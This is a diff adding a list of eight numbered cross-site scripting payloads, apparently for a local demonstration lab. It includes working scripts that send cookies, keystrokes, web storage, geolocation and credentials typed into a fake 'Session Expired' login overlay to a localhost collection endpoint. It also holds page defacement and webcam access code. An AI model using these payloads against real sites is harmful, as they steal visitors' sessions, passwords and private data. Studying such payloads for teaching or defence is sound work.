@@ -1,0 +1,81 @@
+// 1. Basic Alert (Test payload)
+<script>alert('XSS vulnerability confirmed!');</script>
+
+// 2. Cookie Theft
+<script>
+fetch('http://localhost:8000/collect_data/?stolen_cookie=' + encodeURIComponent(document.cookie));
+</script>
+
+// 3. Keylogger Demonstration
+<script>
+let keys = '';
+document.addEventListener('keypress', function(e) {
+    keys += e.key;
+    if(keys.length >= 10) {  // Send every 10 keystrokes
+        fetch('http://localhost:8000/collect_data/?keystrokes=' + encodeURIComponent(keys));
+        keys = '';
+    }
+});
+</script>
+
+// 4. Fake Login Form Injection
+<div style="position:fixed; top:0; left:0; width:100%; height:100%; background-color:rgba(0,0,0,0.8); z-index:10000;">
+    <div style="position:relative; top:20%; left:50%; transform:translate(-50%,-50%); background-color:white; padding:20px; border-radius:5px;">
+        <h2>Session Expired</h2>
+        <p>Please log in again to continue:</p>
+        <form onsubmit="event.preventDefault(); fetch('http://localhost:8000/collect_data/?credentials=' + encodeURIComponent(document.getElementById('fake_username').value + ':' + document.getElementById('fake_password').value));">
+            <input type="text" id="fake_username" placeholder="Username" style="margin:5px;"><br>
+            <input type="password" id="fake_password" placeholder="Password" style="margin:5px;"><br>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+</div>
+
+// 5. Content Defacement
+<script>
+document.querySelectorAll('*').forEach(element => {
+    if (element.childNodes.length === 1 && element.childNodes[0].nodeType === 3)
+        element.textContent = 'Hacked!';
+    if (element.tagName === 'IMG')
+        element.src = 'https://example.com/hacked.jpg';
+});
+</script>
+
+// 6. Session Hijacking with localStorage Theft
+<script>
+const stolenData = {
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
+    cookies: document.cookie
+};
+fetch('http://localhost:8000/collect_data/?storage_data=' + encodeURIComponent(JSON.stringify(stolenData)));
+</script>
+
+// 7. HTML5 Geolocation Theft
+<script>
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(position => {
+        fetch('http://localhost:8000/collect_data/?location=' +
+        encodeURIComponent(JSON.stringify({
+            lat: position.coords.latitude,
+            lng: position.coords.longitude
+        })));
+    });
+}
+</script>
+
+// 8. Webcam Access Demonstration (requires user permission)
+<script>
+if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.autoplay = true;
+            document.body.appendChild(video);
+            // In a real attack, this could stream to an attacker's server
+            console.log('Camera access granted');
+        })
+        .catch(err => console.error('Camera access denied'));
+}
+</script>
